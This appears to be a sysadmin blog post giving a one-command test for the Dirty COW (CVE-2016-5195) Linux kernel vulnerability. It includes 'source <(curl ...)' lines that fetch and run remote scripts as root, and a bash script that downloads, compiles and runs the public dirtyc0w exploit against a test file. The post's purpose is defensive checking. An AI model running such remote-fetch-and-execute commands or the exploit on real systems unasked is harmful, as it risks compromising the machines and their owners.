#How to easily test for Dirty COW (CVE-2016-5195) vulnerability

A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. All the information we have so far is included in this page.

The bug has existed since around 2.6.22 (released in 2007) and was fixed on Oct 18, 2016.

Source: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails

I had a number of servers to quickly test for this exploit, so I wanted to make an incredibly easy script to test the exploit quickly. Thanks to the guys at Red Packet Security for posting the following article: https://www.redpacketsecurity.com/testing-dirty-cow-cve-2016-5195/

I used this as a reference to create a simple, single command you can run to determine whether or not your server is exploitable by Dirty COW. This is very much a simple script and I’ve not rigorously tested it’s results, so please do comment with any feedback or suggestions.

To determine if you’re vulnerable to Dirty COW run the following command as root on your server. You must have GCC installed before running the script.

#CHECK

```sh
source <(curl -s http://davemacaulay.com/scripts/dirtycow.sh)
```

Contents of the dirtycow.sh script are as follows: `ubuntu/dirtycow.sh`

```sh
#!/bin/bash
 
echo -e "\e[32mTesting for Dirty COW (CVE-2016-5195) vulnerability...\e[0m";
 
if [[ $EUID -ne 0 ]]; then
   echo -e "\e[31mThis script must be run as root\e[0m"
else
    # Download the exploit
    curl -s https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c > dirtyc0w.c
 
    # Check our file downloaded
    if [ ! -f dirtyc0w.c ]; then
        echo -e "\e[31mUnable to download dirtyc0w.c from https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c.\e[0m"
    else 
        # Create a new temporary test file to test with
        echo ORIGINAL_STRING > dirtycow_test
        chmod 0404 dirtycow_test
 
        gcc -pthread dirtyc0w.c -o dirtyc0w
 
        ./dirtyc0w dirtycow_test EXPLOITABLE &>/dev/null
 
        if grep -q EXPLOITABLE "dirtycow_test"; 
        then
           echo -e "\e[31mYour server is expoitable by Dirty COW (CVE-2016-5195)\e[0m"
        else
            echo -e "\e[32mYou're safe, no dirty cows here!\e[0m"
        fi
 
        # Clean up junk
        rm -rf dirtycow_test dirtyc0w dirtyc0w.c
    fi
fi
```

By no means am I a bash expert, but it’s much easier to run this single command than multiple as the original article details.

The script creates a couple of files whilst running, dirtycow_test, dirtyc0w & dirtyc0w.c. These are all removed once the script has ran successfully.

#OUTPUT
The script will either report one of the two following messages:
```sh
Testing for Dirty COW (CVE-2016-5195) vulnerability...
Your server is expoitable by Dirty COW (CVE-2016-5195)
```

or
```sh
Testing for Dirty COW (CVE-2016-5195) vulnerability...
You're safe, no dirty cows here!
```

If you get the worrying message saying your server is exploitable please contact your host and ask them to complete the various steps to ensure the security of your server. If you’re a sysadmin please go to the https://dirtycow.ninja page to find out more information on how to fix the issue.


#Ubuntu:

We’ve tested this script on Ubuntu, with a vulnerable kernel the script reports correctly. Once we upgraded the kernel the script reported the vulnerability was no longer present.

#CentOS:

CentOS have released the following script which checks the currently installed kernel version, then reports whether or not the server is vulnerable. These two scripts do not appear to align on whether or not the server is exploitable.

You can run the script using the following:
```sh
source <(curl -s https://access.redhat.com/sites/default/files/rh-cve-2016-5195_1.sh)
```

#Reference
http://davemacaulay.com/easily-test-dirty-cow-cve-2016-5195-vulnerability/

#Links: 
https://github.com/linhlt247/DirtyCOW_CVE-2016-5195/blob/master/check/scripts/ubuntu/dirtycow.sh

https://github.com/linhlt247/DirtyCOW_CVE-2016-5195/blob/master/check/scripts/centos/rh-cve-2016-5195_1.sh

